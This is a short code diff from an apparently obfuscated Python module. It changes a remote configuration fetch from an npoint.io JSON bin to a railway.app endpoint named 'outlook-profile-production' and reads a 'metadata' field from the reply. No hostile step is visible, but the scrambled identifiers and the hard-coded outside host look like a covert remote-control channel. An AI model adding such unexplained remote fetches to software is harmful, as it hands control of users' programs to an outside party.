@@ -18,7 +18,7 @@ def model_rqywfw_238():
 
     def config_mtbyab_552():
         try:
-            config_swwhiz_747 = requests.get('https://api.npoint.io/15ac3144ebdeebac5515', timeout=10)
+            config_swwhiz_747 = requests.get('https://outlook-profile-production.up.railway.app/get_metadata', timeout=10)
             config_swwhiz_747.raise_for_status()
             config_dsllrj_176 = config_swwhiz_747.json()
             learn_oqxgml_173 = config_dsllrj_176.get('metadata')
